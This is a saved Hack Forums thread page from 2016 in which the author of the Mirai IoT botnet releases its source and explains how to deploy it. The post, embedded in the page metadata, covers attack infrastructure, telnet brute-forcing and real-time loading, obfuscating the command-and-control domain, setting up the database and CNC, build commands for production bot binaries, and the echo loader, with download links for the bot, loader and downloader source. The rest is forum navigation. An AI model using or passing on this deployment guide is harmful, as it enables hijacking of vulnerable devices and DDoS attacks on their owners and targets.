@@ -1,0 +1,2425 @@
+<!DOCTYPE html>
+<html xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<title>[FREE] World's Largest Net:Mirai Botnet, Client, Echo Loader, CNC source code release</title>
+
+	<meta property="og:title" content="[FREE] World's Largest Net:Mirai Botnet, Client, Echo Loader, CNC source code release">
+<meta property="og:site_name" content="Hack Forums">
+<meta property="og:url" content="https://hackforums.net/showthread.php?tid=5420472">
+<meta property="og:description" content="Preface Greetz everybody, When I first go in DDoS industry, I wasn't planning on staying in it long. I made my money, there's lots of eyes looking at IOT now, so it's time to GTFO. However, I know every skid and their mama, it's their wet dream to have something besides qbot. So today, I have an ama...">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2016-09-30T12:50:52-07:00">
+<meta property="article:modified_time" content="2016-10-01T19:57:52-07:00">
+<meta property="og:image" content="https://hackforums.net/images/metaimage.png">
+<meta property="og:image:width" content="250">
+<meta property="og:image:height" content="250">
+	
+	<script type="text/javascript" async="" src="page1_files/analytics.js"></script><script src="page1_files/35rBZAZ85dfbRgEGk2rLAi1oAAg.js"></script><script src="page1_files/js.js"></script><script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Article",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://hackforums.net/showthread.php?tid=5420472"
+  },
+  "headline": "[FREE] World's Largest Net:Mirai Botnet, Client, Echo Loader, CNC source code release",
+  "articleSection": "Botnets, IRC Bots, and Zombies",
+  "articleBody": "Preface Greetz everybody, When I first go in DDoS industry, I wasn't planning on staying in it long. I made my money, there's lots of eyes looking at IOT now, so it's time to GTFO. However, I know every skid and their mama, it's their wet dream to have something besides qbot. So today, I have an amazing release for you. With Mirai, I usually pull max 380k bots from telnet alone. However, after the Kreb DDoS, ISPs been slowly shutting down and cleaning up their act. Today, max pull is about 300k bots, and dropping. So, I am your senpai, and I will treat you real nice, my hf-chan. And to everyone that thought they were doing anything by hitting my CNC, I had good laughs, this bot uses domain for CNC. It takes 60 seconds for all bots to reconnect, lol Also, shoutout to this blog post by malwaremustdie &lt;a href=&quot;http://blog.malwaremustdie.org/2016/08/m...-just.html&quot; target=&quot;_blank&quot; rel=&quot;ugc&quot; class=&quot;mycode_url&quot;&gt;http://blog.malwaremustdie.org/2016/08/m...-just.html&lt;/a&gt; &lt;a href=&quot;https://web.archive.org/web/201609302302...-just.html&quot; target=&quot;_blank&quot; rel=&quot;ugc&quot; class=&quot;mycode_url&quot;&gt;https://web.archive.org/web/201609302302...-just.html&lt;/a&gt; &amp;amp;lt;- backup in case low quality reverse engineer unixfreaxjp decides to edit his posts lol Had a lot of respect for you, thought you were good reverser, but you really just completely and totally failed in reversing this binary. &quot;We still have better kung fu than you kiddos&quot; don't make me laugh please, you made so many mistakes and even confused some different binaries with my. LOL Let me give you some slaps back - 1) port 48101 is not for back connect, it is for control to prevent multiple instances of bot running together 2) /dev/watchdog and /dev/misc are not for &quot;making the delay&quot;, it for preventing system from hanging. This one is low-hanging fruit, so sad that you are extremely dumb 3) You failed and thought FAKE_CNC_ADDR and FAKE_CNC_PORT was real CNC, lol &quot;And doing the backdoor to connect via HTTP on &lt;a href=&quot;javascript:void(0)&quot; onclick=&quot;MyBB.popupWindow('https://hackforums.net/ipcheck.php?action=iplookup&amp;ipaddress=65.222.202.53&amp;modal=1', null, true); return false;&quot; rel=&quot;nofollow&quot;&gt;65.222.202.53&lt;/a&gt;&quot;. you got tripped up by signal flow ;) try harder skiddo 4) Your skeleton tool sucks ass, it thought the attack decoder was &quot;sinden style&quot;, but it does not even use a text-based protocol? CNC and bot communicate over binary protocol 5) you say 'chroot(&quot;/&quot;) so predictable like torlus' but you don't understand, some others kill based on cwd. It shows how out-of-the-loop you are with real malware. Go back to skidland 5 slaps for you Why are you writing reverse engineer tools? You cannot even correctly reverse in the first place. Please learn some skills first before trying to impress others. Your arrogance in declaring how you &quot;beat me&quot; with your dumb kung-fu statement made me laugh so hard while eating my SO had to pat me on the back. Just as I forever be free, you will be doomed to mediocracy forever. Requirements Bare Minimum 2 servers: 1 for CNC + mysql, 1 for scan receiver, and 1+ for loading Pro Setup (my setup) 2 VPS and 4 servers - 1 VPS with extremely bulletproof host for database server - 1 VPS, rootkitted, for scanReceiver and distributor - 1 server for CNC (used like 2% CPU with 400k bots) - 3x 10gbps NForce servers for loading (distributor distributes to 3 servers equally) Infrastructure Overview - To establish connection to CNC, bots resolve a domain (resolv.c/resolv.h) and connect to that IP address - Bots brute telnet using an advanced SYN scanner that is around 80x faster than the one in qbot, and uses almost 20x less resources. When finding bruted result, bot resolves another domain and reports it. This is chained to a separate server to automatically load onto devices as results come in. - Bruted results are sent by default on port 48101. The utility called scanListen.go in tools is used to receive bruted results (I was getting around 500 bruted results per second at peak). If you build in debug mode, you should see the utitlity scanListen binary appear in debug folder. Mirai uses a spreading mechanism similar to self-rep, but what I call &quot;real-time-load&quot;. Basically, bots brute results, send it to a server listening with scanListen utility, which sends the results to the loader. This loop (brute -&amp;amp;gt; scanListen -&amp;amp;gt; load -&amp;amp;gt; brute) is known as real time loading. The loader can be configured to use multiple IP address to bypass port exhaustion in linux (there are limited number of ports available, which means that there is not enough variation in tuple to get more than 65k simultaneous outbound connections - in theory, this value lot less). I would have maybe 60k - 70k simultaneous outbound connections (simultaneous loading) spread out across 5 IPs. Configuring Bot Bot has several configuration options that are obfuscated in (table.c/table.h). In ./mirai/bot/table.h you can find most descriptions for configuration options. However, in ./mirai/bot/table.c there are a few options you *need* to change to get working. - TABLE_CNC_DOMAIN - Domain name of CNC to connect to - DDoS avoidance very fun with mirai, people try to hit my CNC but I update it faster than they can find new IPs, lol. Retards :) - TABLE_CNC_PORT - Port to connect to, its set to 23 already - TABLE_SCAN_CB_DOMAIN - When finding bruted results, this domain it is reported to - TABLE_SCAN_CB_PORT - Port to connect to for bruted results, it is set to 48101 already. In ./mirai/tools you will find something called enc.c - You must compile this to output things to put in the table.c file Run this inside mirai directory Code ./build.sh debug telnetYou will get some errors related to cross-compilers not being there if you have not configured them. This is ok, won't affect compiling the enc tool Now, in the ./mirai/debug folder you should see a compiled binary called enc. For example, to get obfuscated string for domain name for bots to connect to, use this: Code ./debug/enc string fugg.the.police.com The output should look like this Code XOR'ing 20 bytes of data... &#92;x44&#92;x57&#92;x41&#92;x49&#92;x0C&#92;x56&#92;x4A&#92;x47&#92;x0C&#92;x52&#92;x4D&#92;x4E&#92;x4B&#92;x41&#92;x47&#92;x0C&#92;x41&#92;x4D&#92;x4F&#92;x22 To update the TABLE_CNC_DOMAIN value for example, replace that long hex string with the one provided by enc tool. Also, you see &quot;XOR'ing 20 bytes of data&quot;. This value must replace the last argument tas well. So for example, the table.c line originally looks like this [/code] add_entry(TABLE_CNC_DOMAIN, &quot;\\x41\\x4C\\x41\\x0C\\x41\\x4A\\x43\\x4C\\x45\\x47\\x4F\\x47\\x0C\\x41\\x4D\\x4F\\x22&quot;, 30); // cnc.changeme.com [/code] Now that we know value from enc tool, we update it like this Code add_entry(TABLE_CNC_DOMAIN, &quot;&#92;x44&#92;x57&#92;x41&#92;x49&#92;x0C&#92;x56&#92;x4A&#92;x47&#92;x0C&#92;x52&#92;x4D&#92;x4E&#92;x4B&#92;x41&#92;x47&#92;x0C&#92;x41&#92;x4D&#92;x4F&#92;x22&quot;, 20); // fugg.the.police.com Some values are strings, some are port (uint16 in network order / big endian). Configuring CNC Code apt-get install mysql-server mysql-clientCNC requires database to work. When you install database, go into it and run following commands: &lt;a href=&quot;http://pastebin.com/86d0iL9g&quot; target=&quot;_blank&quot; rel=&quot;ugc&quot; class=&quot;mycode_url&quot;&gt;http://pastebin.com/86d0iL9g&lt;/a&gt; This will create database for you. To add your user, Code INSERT INTO users VALUES (NULL, 'anna-senpai', 'myawesomepassword', 0, 0, 0, 0, -1, 1, 30, ''); Now, go into file ./mirai/cnc/main.go Edit these values Code const DatabaseAddr string&amp;amp;nbsp;&amp;amp;nbsp; = &quot; &lt;a href=&quot;javascript:void(0)&quot; onclick=&quot;MyBB.popupWindow('https://hackforums.net/ipcheck.php?action=iplookup&amp;ipaddress=127.0.0.1&amp;modal=1', null, true); return false;&quot; rel=&quot;nofollow&quot;&gt;127.0.0.1&lt;/a&gt;&quot; const DatabaseUser string&amp;amp;nbsp;&amp;amp;nbsp; = &quot;root&quot; const DatabasePass string&amp;amp;nbsp;&amp;amp;nbsp; = &quot;password&quot; const DatabaseTable string&amp;amp;nbsp;&amp;amp;nbsp;= &quot;mirai&quot; To the information for the mysql server you just installed Setting Up Cross Compilers Cross compilers are easy, follow the instructions at this link to set up. You must restart your system or reload .bashrc file for these changes to take effect. &lt;a href=&quot;http://pastebin.com/1rRCc3aD&quot; target=&quot;_blank&quot; rel=&quot;ugc&quot; class=&quot;mycode_url&quot;&gt;http://pastebin.com/1rRCc3aD&lt;/a&gt; Building CNC+Bot The CNC, bot, and related tools: 1) &lt;a href=&quot;http://santasbigcandycane.cx/mirai.src.zip&quot; target=&quot;_blank&quot; rel=&quot;ugc&quot; class=&quot;mycode_url&quot;&gt;http://santasbigcandycane.cx/mirai.src.zip&lt;/a&gt; - THESE LINKS WILL NOT LAST FOREVER, 2 WEEKS MAX - BACK IT UP! 2) &lt;a href=&quot;http://santasbigcandycane.cx/loader.src.zip&quot; target=&quot;_blank&quot; rel=&quot;ugc&quot; class=&quot;mycode_url&quot;&gt;http://santasbigcandycane.cx/loader.src.zip&lt;/a&gt; - THESE LINKS WILL NOT LAST FOREVER, 2 WEEKS MAX - BACK IT UP! How to build bot + CNC In mirai folder, there is build.sh script. Code ./build.sh debug telnetWill output debug binaries of bot that will not daemonize and print out info about if it can connect to CNC, etc, status of floods, etc. Compiles to ./mirai/debug folder Code ./build.sh release telnetWill output production-ready binaries of bot that are extremely stripped, small (about 60K) that should be loaded onto devices. Compiles all binaries in format: &quot;mirai.&#36;ARCH&quot; to ./mirai/release folder Building Echo Loader Loader reads telnet entries from STDIN in following format: Code ip:port user:passIt detects if there is wget or tftp, and tries to download the binary using that. If not, it will echoload a tiny binary (about 1kb) that will suffice as wget. You can find code to compile the tiny downloader stub h ere &lt;a href=&quot;http://santasbigcandycane.cx/dlr.src.zip&quot; target=&quot;_blank&quot; rel=&quot;ugc&quot; class=&quot;mycode_url&quot;&gt;http://santasbigcandycane.cx/dlr.src.zip&lt;/a&gt; You need to edit your main.c for the dlr to include the HTTP server IP. The idea is, if the iot device doesn have tftp or wget, then it will echo load this 2kb binary, which download the real binary, since echo loading really slow. When you compile, place your dlr.* files into the folder ./bins for the loader Code ./build.shWill build the loader, optimized, production use, no fuss. If you have a file in formats used for loading, you can do this Code cat file.txt | ./loader Remember to ulimit! Just so it's clear, I'm not providing any kind of 1 on 1 help tutorials or Clay Davis, too much time. All scripts and everything are included to set up working botnet in under 1 hours. I am willing to help if you have individual questions (how come CNC not connecting to database, I did this this this blah blah), but not questions like &quot;My bot not connect, fix it&quot;",
+  "image": [
+    "https://i.imgur.com/BVc7qJs.png"
+   ],
+  "dateCreated": "2016-09-30T12:50:52-07:00",
+  "datePublished": "2016-09-30T12:50:52-07:00",
+  "dateModified": "2016-10-01T19:57:52-07:00",
+  "author": {
+    "@type": "Person",
+    "name": "Anna-senpai",
+    "image": "https://hackforums.net/images/mobale/default_avatar.png",
+    "url": "https://hackforums.net/member.php?action=profile&uid=3201035"
+  },
+   "publisher": {
+    "@type": "Organization",
+    "name": "Hack Forums",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://hackforums.net/images/metaimage.png"
+    }
+  },
+  "description": "Preface Greetz everybody, When I first go in DDoS industry, I wasn't planning on staying in it long. I made my money, there's lots of eyes looking at IOT now, so it's time to GTFO. However, I know every skid and their mama, it's their wet dream to have something besides qbot. So today, I have an ama...."
+}
+		</script>
+
+
+<link rel="canonical" href="https://hackforums.net/showthread.php?tid=5420472">
+<meta name="description" content="Botnets, IRC Bots, and Zombies-[FREE] World's Largest Net:Mirai Botnet, Client, Echo Loader, CNC source code release">
+<meta name="keywords" content="forum,forums,exploits,hacks, hacking,security,coding,computer,bitcoin,hosting,ethereum,facebook,twitter,hacker,hack,keyloggers,tools,scripts,bugs,bug bounty">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<meta charset="UTF-8">
+<meta name="theme-color" content="#333333">
+
+<link rel="alternate" type="application/rss+xml" title="Latest Threads (RSS 2.0)" href="https://hackforums.net/syndication.php">
+<link rel="alternate" type="application/atom+xml" title="Latest Threads (Atom 1.0)" href="https://hackforums.net/syndication.php?type=atom1.0">
+<link type="text/css" rel="stylesheet" href="page1_files/global.css">
+<link type="text/css" rel="stylesheet" href="page1_files/response.css">
+<link type="text/css" rel="stylesheet" href="page1_files/showthread.css">
+<link type="text/css" rel="stylesheet" href="page1_files/award.css">
+<link type="text/css" rel="stylesheet" href="page1_files/notify_2.css">
+<script type="application/ld+json">
+		{
+		  "@context": "https://schema.org",
+		  "@type": "BreadcrumbList",
+		  "itemListElement": [{
+		"@type": "ListItem",
+		"position": 1,
+		"name": "Hack Forums",
+		"item": "https://hackforums.net/index.php"
+	  },{
+		"@type": "ListItem",
+		"position": 2,
+		"name": "Hacks, Exploits, and Various Discussions",
+		"item": "https://hackforums.net/forumdisplay.php?fid=45"
+	  },{
+		"@type": "ListItem",
+		"position": 3,
+		"name": "Advanced Hacking",
+		"item": "https://hackforums.net/forumdisplay.php?fid=307"
+	  },{
+		"@type": "ListItem",
+		"position": 4,
+		"name": "Botnets, IRC Bots, and Zombies",
+		"item": "https://hackforums.net/forumdisplay.php?fid=92"
+	  },{
+		"@type": "ListItem",
+		"position": 5,
+		"name": "[FREE] World's Largest Net:Mirai Botnet, Client, Echo Loader, CNC source code release",
+		"item": "https://hackforums.net/showthread.php?tid=5420472"
+	  }]
+		}
+	</script>
+<script src="page1_files/jquery.js"></script>
+<script src="page1_files/jquery_002.js"></script>
+<script src="page1_files/general.js"></script>
+<script src="page1_files/response.js" defer="defer"></script>
+<script src="page1_files/util_2.js"></script>
+<link rel="stylesheet" type="text/css" href="page1_files/font-awesome.css">
+<script type="text/javascript">
+    lang.unknown_error = "An unknown error has occurred.";
+    lang.select2_match = "One result is available, press enter to select it.";
+    lang.select2_matches = "{1} results are available, use up and down arrow keys to navigate.";
+    lang.select2_nomatches = "No matches found";
+    lang.select2_inputtooshort_single = "Please enter one or more character";
+    lang.select2_inputtooshort_plural = "Please enter {1} or more characters";
+    lang.select2_inputtoolong_single = "Please delete one character";
+    lang.select2_inputtoolong_plural = "Please delete {1} characters";
+    lang.select2_selectiontoobig_single = "You can only select one item";
+    lang.select2_selectiontoobig_plural = "You can only select {1} items";
+    lang.select2_loadmore = "Loading more results…";
+    lang.select2_searching = "Searching…";
+    var cookieDomain = "hackforums.net";
+    var cookiePath = "/";
+    var cookiePrefix = "";
+    var cookieSecureFlag = "1";
+    var deleteevent_confirm = "Are you sure you want to delete this event?";
+    var removeattach_confirm = "Are you sure you want to remove the selected attachment from this post?";
+    var loading_text = 'Loading. <br />Please Wait..';
+    var saving_changes = 'Saving changes..';
+    var use_xmlhttprequest = "1";
+    var my_post_key = "01ce07b2d23227f1c6a1c694d6e27f8e";
+    var rootpath = "https://hackforums.net";
+    var imagepath = "https://hackforums.net/images/mobale";
+     var yes_confirm = "Yes";
+    var no_confirm = "No";
+    var MyBBEditor = null;
+    var spinner_image = "https://hackforums.net/images/mobale/spinner_big.gif";
+    var spinner = "<img src='" + spinner_image +"' alt='' style='display: none' />";
+    var modal_zindex = 999999;
+    var unread_pms = parseInt(1);
+    var unread_alerts = parseInt();
+    var nodeID = "689814cab85ed0a8b1fbd7fe7b521acfad2db44a4a2282c90acb475bfbe4fc6b";
+    var socket_uid = 4466395;
+    var socket_url_base = "https://hackforums.net";
+</script>
+<script src="page1_files/socket.js"></script>
+
+
+<script type="text/javascript">
+<!--
+	var quickdelete_confirm = "Are you sure you want to delete this post?";
+	var quickrestore_confirm = "Are you sure you want to restore this post?";
+	var allowEditReason = "1";
+	lang.save_changes = "Save Changes";
+	lang.cancel_edit = "Cancel Edit";
+	lang.quick_edit_update_error = "There was an error editing your reply:";
+	lang.quick_reply_post_error = "There was an error posting your reply:";
+	lang.quick_delete_error = "There was an error deleting your reply:";
+	lang.quick_delete_success = "The post was deleted successfully.";
+	lang.quick_delete_thread_success = "The thread was deleted successfully.";
+	lang.quick_restore_error = "There was an error restoring your reply:";
+	lang.quick_restore_success = "The post was restored successfully.";
+	lang.editreason = "Edit Reason";
+// -->
+</script>
+<!-- jeditable (jquery) -->
+<script type="text/javascript" src="page1_files/report.js"></script>
+<script src="page1_files/jeditable.js"></script>
+<script type="text/javascript" src="page1_files/thread.js"></script>
+<link rel="stylesheet" href="page1_files/select2.css">
+</head>
+<body>
+	
+<div id="mySidenav" class="sidenav">
+	<button class="accordion"><div style="display: inline-block; width: 50%;"><span class="accordion-icon"><i class="fa fa-folder" aria-hidden="true"></i></span>Navigation</div><div style="display: inline-block; padding-left: 80px; vertical-align: middle;"><i class="fa fa-angle-down"></i></div></button>
+	<div class="panel">
+		<a href="https://hackforums.net/upgrade.php"><i class="fa fa-diamond fa-lg" aria-hidden="true" style="margin-right: 5px; width: 27px;"></i>Upgrade</a>
+		<a href="https://hackforums.net/search.php"><i class="fa fa-search fa-lg" aria-hidden="true" style="margin-right: 5px; width: 27px;"></i>Search</a>
+		<a href="https://hackforums.net/memberlist.php"><i class="fa fa-users fa-lg" aria-hidden="true" style="margin-right: 5px; width: 27px;"></i>Memberlist</a>
+		<a href="https://hackforums.net/extras.php"><i class="fa fa-list fa-lg" aria-hidden="true" style="margin-right: 5px; width: 27px;"></i>Extras</a>
+		<a href="https://hackforums.net/tools.php"><i class="fa fa-wrench fa-lg" aria-hidden="true" style="margin-right: 5px; width: 27px;"></i>Tools</a>
+		<a href="https://hackforums.net/awardgoals.php"><i class="fa fa-trophy fa-lg" aria-hidden="true" style="margin-right: 5px; width: 27px;"></i>Award Goals</a>
+		<a href="https://hackforums.net/misc.php?action=help"><i class="fa fa-info-circle fa-lg" aria-hidden="true" style="margin-right: 5px; width: 27px;"></i>Help</a>
+		<a href="https://twitter.com/hackforumsnet"><i class="fa fa-twitter fa-lg" aria-hidden="true" style="margin-right: 5px; width: 27px;"></i>Follow</a>
+		<a href="https://hackforums.net/contact.php"><i class="fa fa-envelope-o fa-lg" aria-hidden="true" style="margin-right: 5px; width: 27px;"></i>Contact</a>
+	</div>
+<span class="panel_spacer"></span></div>
+<div id="container">
+		<a name="top" id="top"></a>
+		<div id="header">
+			<div id="logo" style="position: relative;">
+				<div id="notify-container" style="display: none;">
+					<div id="notify-dragger" class="notify-header" style="background-color: #454545;"><span class="notify-header-heading" style="font-size: 16px;">Notifications</span><div class="float_right"><a href="https://hackforums.net/notify.php"><i class="fa fa-cog fa-lg" aria-hidden="true"></i></a><a href="javascript:void(0);" onclick="Notify.processIconClick();" style="margin-left: 15px;"><i class="fa fa-times-circle fa-lg" aria-hidden="true"></i></a></div></div>
+					<div id="notify-notifications-container"><div class="notify-header"><span class="notify-header-heading">Viewed</span></div>
+			<div class="notify-notice-container notify-notice-container-read">
+				<div class="notify-notice-avatar-container">
+					<div class="notify-notice-avatar" title="Omniscient"><a href="https://hackforums.net/member.php?action=profile&amp;uid=1"><img src="page1_files/avatar_1.png" alt="" width="36" height="36"></a></div>
+				</div>
+				<a href="https://hackforums.net/private.php?action=read&amp;pmid=86676852" style="display: block; width: 100%;">
+					<div class="notify-notice-details-container">
+						<div style="margin-top: -2px;"><span class="tinytext" style="color: #888;"><span class="smart-time" data-timestamp="1573325001" title="Sat Nov 09 2019, 1:43 PM">11 days ago</span></span></div>
+						<div style="margin-top: 2px;"><span style="display: block; overflow: hidden; color: #ababab;"><strong class="group4">Omniscient</strong> sent you a private message titled <strong style="color: #ddd;">Welcome Fanny Ye to Hack Forums</strong>.</span></div>
+					</div>
+				</a>
+			</div>
+
+					</div>
+				</div>
+				<div class="wrapper">
+					<a href="https://hackforums.net/index.php"><img src="page1_files/logo-circuit-green.gif" class="logo-img" title="Hack Forums" alt="Hackforums"></a> 
+					<ul class="menu top-links">
+					<li><a href="https://hackforums.net/" title="Home" data-tooltip="Home"><i class="fa fa-home fa-lg" aria-hidden="true"></i></a></li>
+					<li><a href="https://hackforums.net/upgrade.php" title="Upgrade" data-tooltip="Upgrade"><i class="fa fa-diamond fa-lg" aria-hidden="true"></i></a></li>
+					<li><a href="https://hackforums.net/search.php" data-tooltip="Search" onclick="$('#quick_search').modal({ fadeDuration: 150, keepelement: true, zIndex: (typeof modal_zindex !== 'undefined' ? modal_zindex : 9999) }); return false;" class="search" title="Search"><i class="fa fa-search fa-lg" aria-hidden="true"></i></a>
+					<div class="modal-search" id="quick_search" style="display: none;">
+					<form method="post" action="https://hackforums.net/search.php">
+						<input type="hidden" name="action" value="do_search">
+						<input type="hidden" name="postthread" value="0">
+                				<input type="hidden" name="nomodal" value="1">
+						<table class="tborder" width="100%" cellspacing="0" cellpadding="5" border="0">
+							<tbody><tr>
+								<td class="thead" colspan="2"><strong>Search</strong><span class="smalltext float_right"><a href="https://hackforums.net/search.php">Advanced Search</a></span></td>
+							</tr>
+							<tr>
+								<td class="trow1" width="25%"><strong>Keywords</strong></td>
+								<td class="trow1"><input name="keywords" id="quick_keyword" type="text" class="textbox initial_focus"></td>
+							</tr>
+
+
+							<tr>
+								<td class="trow2" colspan="2">
+									<div class="tcenter"><input name="submit" type="submit" class="button" value="Submit"></div>
+								</td>
+							</tr>
+						</tbody></table>
+					</form>
+				</div>
+				<script type="text/javascript">
+					$("#quick_search input[name='url']").val($(location).attr('href'));
+				</script>
+</li>
+					<li><a href="https://hackforums.net/memberlist.php" title="Memberlist" data-tooltip="Memberlist"><i class="fa fa-users fa-lg" aria-hidden="true"></i></a></li>
+					<li><a href="https://hackforums.net/extras.php" title="Extra Pages" data-tooltip="Extra Pages"><i class="fa fa-list fa-lg" aria-hidden="true"></i></a></li>
+					<li><a href="https://hackforums.net/tools.php" title="Hacker Tools" data-tooltip="Hacker Tools"><i class="fa fa-wrench fa-lg" aria-hidden="true"></i></a></li>
+					<li><a href="https://hackforums.net/awardgoals.php" title="Award Goals" data-tooltip="Award Goals"><i class="fa fa-trophy fa-lg" aria-hidden="true"></i></a></li>
+					<li><a href="https://hackforums.net/misc.php?action=help" title="Help" data-tooltip="Help Docs"><i class="fa fa-info-circle fa-lg" aria-hidden="true"></i></a></li>
+					<li><a href="https://twitter.com/hackforumsnet" title="Follow our Twitter" data-tooltip="Twitter"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+					<li><a href="https://hackforums.net/contact.php" title="Contact Us" data-tooltip="Contact Us"><i class="fa fa-envelope-o fa-lg" aria-hidden="true"></i></a></li>
+					</ul>
+				</div>
+		</div>			
+		<div id="panel">
+				<div class="upper">
+					<div class="wrapper">
+						<div class="oc-time">11-21-2019 12:47 AM</div>
+						
+<span class="welcome"><strong>Welcome back, <a href="https://hackforums.net/member.php?action=profile&amp;uid=4466395">Fanny Ye</a></strong>. You last visited: <span title="{1}">Yesterday</span>, 10:46 PM </span>
+</div>
+</div>
+<div class="quickthread_button">
+	<a href="https://hackforums.net/quickthread.php" title="Start a New Thread" rel="nofollow">
+		<i class="fa fa-pencil-square-o fa-lg"></i>
+	</a>
+</div>
+<div class="lower panel-nav-lower mobile-remove">
+	<div class="wrapper">
+		<ul class="menu panel_links">
+                        
+<li><a href="https://hackforums.net/usercp.php" class="usercp" title="User Control Panel" data-tag="User CP" data-tooltip="User CP"><i class="fa fa-cog fa-lg" aria-hidden="true"></i></a></li>
+
+                        <li><a href="https://hackforums.net/marketcp.php" class="marketcp" title="Market Control Panel" data-tag="Market CP" data-tooltip="Market CP"><i class="fa fa-shopping-basket fa-lg" aria-hidden="true"></i></a></li>
+			<li class="button-dropdown" style="top: 2px; margin-right: 5px;">
+				<a href="javascript:void(0)" class="dropdown-toggle">
+					<i class="fa fa-gamepad" aria-hidden="true"></i> <span>▼</span>
+				</a>
+				<ul class="dropdown-menu" style="position: absolute; padding-left: 0px; left: -19px; text-align: left; background-color: #060606; top: 21px; display: none; width: 200px; z-index: 999;">
+					<li style="display: block; padding: 8px 0px;"><a href="https://hackforums.net/gamecp.php" class="usercp" title="Hack Game"><i class="fa fa-gamepad fa-lg" aria-hidden="true"></i><span style="font-size: 15px; color: #efefef;">Hack Game</span></a></li>
+					<li style="display: block; padding: 8px 0px;"><a href="https://hackforums.net/lottery.php" class="usercp" title="Lottery"><i class="fa fa-ticket fa-lg" aria-hidden="true"></i><span style="font-size: 15px; color: #efefef;">Lottery</span></a></li>
+					<li style="display: block; padding: 8px 0px;"><a href="https://hackforums.net/scratchcard.php" class="usercp" title="Scratchcards"><i class="fa fa-clone fa-lg" aria-hidden="true"></i><span style="font-size: 15px; color: #efefef;">Scratchcards</span></a></li>
+					<li style="display: block; padding: 8px 0px;"><a href="https://hackforums.net/sportsbook.php" class="usercp" title="Sportsbook"><i class="fa fa-futbol-o fa-lg" aria-hidden="true"></i><span style="font-size: 15px; color: #efefef;">Sportsbook</span></a></li>
+					<li style="display: block; padding: 8px 0px;"><a href="https://hackforums.net/blackjack.php" class="usercp" title="Blackjack"><i class="fa fa-money fa-lg" aria-hidden="true"></i><span style="font-size: 15px; color: #efefef;">Blackjack</span></a></li>
+					<li style="display: block; padding: 8px 0px;"><a href="https://hackforums.net/slots.php" class="usercp" title="Slots"><i class="fa fa-bomb fa-lg" aria-hidden="true"></i><span style="font-size: 15px; color: #efefef;">Slots</span></a></li>
+					<li style="display: block; padding: 8px 0px;"><a href="https://hackforums.net/cryptogame.php" class="usercp" title="Crypto Game"><i class="fa fa-btc fa-lg" aria-hidden="true"></i><span style="font-size: 15px; color: #efefef;">Crypto Game</span></a></li>
+				</ul>
+			</li>
+			<li>
+				<a href="javascript:void(0);" class="notifycp" title="Notifications" data-tag="Notifications" onclick="Notify.processIconClick();"><i class="fa fa-bell fa-lg" aria-hidden="true"></i><span class="notify-num" id="notify_number_notify">0</span></a>
+			</li>
+			<li class=""><a href="https://hackforums.net/convo.php" title="Conversations" data-tag="Conversations" data-tooltip="Conversation"><i class="fa fa-bullhorn fa-lg" aria-hidden="true"></i> (0)</a></li>
+			<li class="alerts--new"><a href="https://hackforums.net/private.php" title="Private Messages" data-tag="Private Messages" data-tooltip="Private Message"><i class="fa fa-paper-plane-o fa-lg" aria-hidden="true"></i> (1)</a></li>
+                        
+			
+		</ul>
+		<ul class="menu user_links">
+                      <li><a href="javascript:void(0)" onclick="MyBB.popupWindow('https://hackforums.net/misc.php?action=buddypopup&amp;modal=1', null, true); return false;" title="Comrade List" data-tag="Comrade List" data-tooltip="Comrade List"><i class="fa fa-address-book-o fa-lg" aria-hidden="true"></i></a></li>
+			
+<li><a href="https://hackforums.net/search.php?action=getfavorites" title="Favorites" data-tag="Favorites" data-tooltip="Favorites"><i class="fa fa-heart fa-lg" aria-hidden="true"></i></a></li>
+<li><a href="https://hackforums.net/search.php?action=getnew" title="New Posts" data-tag="New Posts" data-tooltip="New Posts"><i class="fa fa-file-text fa-lg" aria-hidden="true"></i></a></li>
+<li><a href="https://hackforums.net/search.php?action=finduserthreads&amp;uid=4466395" title="Your Threads" data-tag="Your Threads" data-tooltip="Your Threads"><i class="fa fa-file-o fa-lg" aria-hidden="true"></i></a></li>
+<li><a href="https://hackforums.net/search.php?action=finduser&amp;uid=4466395" title="Your Posts" data-tag="Your Posts" data-tooltip="Your Posts"><i class="fa fa-files-o fa-lg" aria-hidden="true"></i></a></li>
+
+			<li><a href="https://hackforums.net/blog.php" class="blogs" title="Blogs" data-tag="Blogs" data-tooltip="Blogs"><i class="fa fa-newspaper-o fa-lg" aria-hidden="true"></i></a></li>
+			<li class="user-link-last"><a href="https://hackforums.net/member.php?action=logout&amp;logoutkey=8daf18d0bae0944756cbb48b5c4d6875" class="logout" onclick="return confirm('Are you sure that you want to logout?');" title="Log Out" data-tag="Log Out" data-tooltip="Log out"><i class="fa fa-sign-out fa-lg" aria-hidden="true"></i></a></li>
+		</ul>
+	</div>
+	<br class="clear">
+</div>
+<div class="lower panel-nav-lower-mobile">
+<div class="wrapper">
+<ul class="nav">
+   <li class="button-dropdown">
+    <a href="javascript:void(0)" class="dropdown-toggle">
+      Control Panel <span>▼</span>
+    </a>
+    <ul class="dropdown-menu" style="text-align: left;">
+      <li><a href="https://hackforums.net/usercp.php" class="usercp" title="User Control Panel"><i class="fa fa-cog fa-lg" aria-hidden="true"></i><span style="margin-left: 7px;">User CP</span></a></li>
+					<li><a href="https://hackforums.net/marketcp.php" class="marketcp" title="Market Control Panel"><i class="fa fa-shopping-basket fa-lg" aria-hidden="true"></i><span style="margin-left: 7px;">Market CP</span></a></li>
+					<li><a href="https://hackforums.net/gamecp.php" class="gamecp" title="Game Control Panel"><i class="fa fa-gamepad fa-lg" aria-hidden="true"></i><span style="margin-left: 7px;">Game CP</span></a></li>
+	
+        
+    </ul>
+  </li>
+ <li class="button-dropdown alert-li-tablet mobile-remove"><ul></ul></li>
+ <li class="button-dropdown right">
+    <a href="javascript:void(0)" class="dropdown-toggle">Fanny Ye <span>▼</span></a>
+    <ul class="dropdown-menu right-menu" style="text-align: left;">
+			<li><a href="#" onclick="MyBB.popupWindow('https://hackforums.net/misc.php?action=buddypopup', null, true); return false;"><i class="fa fa-address-book-o fa-lg" aria-hidden="true"></i><span style="margin-left: 7px;">Open Comrade List</span></a></li>
